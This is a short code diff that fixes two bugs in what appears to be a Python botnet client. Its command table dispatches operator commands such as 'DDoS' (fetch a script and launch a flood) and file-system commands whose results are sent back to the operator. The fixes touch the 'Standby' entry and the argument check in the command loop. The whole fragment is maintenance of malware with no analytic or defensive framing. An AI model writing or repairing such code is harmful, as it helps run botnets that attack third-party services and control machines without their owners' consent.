@@ -100,7 +100,7 @@ def Standby(hours):
 
 steps = {
     "DDoS": (get_script, launchDDoS),
-    "Standby": (Standby),
+    "Standby": (Standby, ),
     "ls" : (ls, send_result),
     "cd" : (cd, send_result),
     "pwd" : (pwd, send_result),
@@ -123,7 +123,7 @@ def run():
                 for step in steps[command[0]]:
                     args = inspect.getargspec(step)[0]
                     assert(isinstance(args, list))
-                    if 'path' in args or 'file_name' in args or 'cmd' in args or 'hour' in args:
+                    if 'path' in args or 'file_name' in args or 'cmd' in args or 'hours' in args:
                         step(command[1])
                     else:
                         step()
